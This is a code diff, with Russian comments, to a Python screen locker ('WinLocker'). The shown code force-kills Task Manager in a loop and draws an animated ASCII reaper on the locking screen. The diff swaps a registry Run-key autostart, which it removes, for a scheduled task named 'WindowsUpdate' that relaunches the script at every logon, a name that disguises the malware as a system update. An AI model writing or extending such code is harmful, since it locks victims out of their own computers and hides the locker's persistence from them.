@@ -24,18 +24,13 @@ def kill_taskmgr():
         os.system("taskkill /f /im taskmgr.exe >nul 2>&1")
         time.sleep(0.1)
 
-# === ПРОПИСЫВАЕМ В АВТОЗАГРУЗКУ ===
+# === ПРОПИСЫВАЕМ В АВТОЗАГРУЗКУ (МЕТОД С ПЛАНИРОВЩИКОМ) ===
 def add_to_startup():
-    import winreg
-    key = winreg.HKEY_CURRENT_USER
-    subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
-    try:
-        reg = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(reg, "WindowsUpdate", 0, winreg.REG_SZ,
-                         sys.executable + ' "' + os.path.abspath(__file__) + '"')
-        winreg.CloseKey(reg)
-    except:
-        pass
+    import subprocess
+    script_path = os.path.abspath(__file__)
+    command = f'python "{script_path}"'
+    # Создаём задание в планировщике
+    subprocess.run(f'schtasks /create /tn "WindowsUpdate" /tr "{command}" /sc onlogon /f', shell=True, capture_output=True)
 
 # === ОТКРЫВАЕМ ВИДЕО ВК В БРАУЗЕРЕ ===
 def play_video():
@@ -102,6 +97,7 @@ class WinLocker:
     
     def draw_reaper(self, x, y, frame):
         """Рисует ASCII Смерть с косой"""
+        import math
         lines = [
             "     .-"-.",
             "    /|6 6|\\",
@@ -110,19 +106,16 @@ class WinLocker:
             "   (/ /^\\ \\)-'",
             "    \"\"' '\"\""
         ]
-        # Добавляем косу
         angle = frame * 0.1
         end_x = x + int(40 * math.cos(angle))
         end_y = y + int(40 * math.sin(angle))
         self.canvas.create_line(x, y, end_x, end_y, fill='white', width=2)
-        # Рисуем саму смерть
         for i, line in enumerate(lines):
             self.canvas.create_text(x, y + i * 20, text=line, fill='white', font=('Courier', 16), tags="reaper")
     
     def animate(self):
         self.canvas.delete("reaper")
         import math
-        # Рисуем Смерть с косой в центре
         self.draw_reaper(400, 500, int(time.time() * 10))
         
         if random.random() < 0.1:
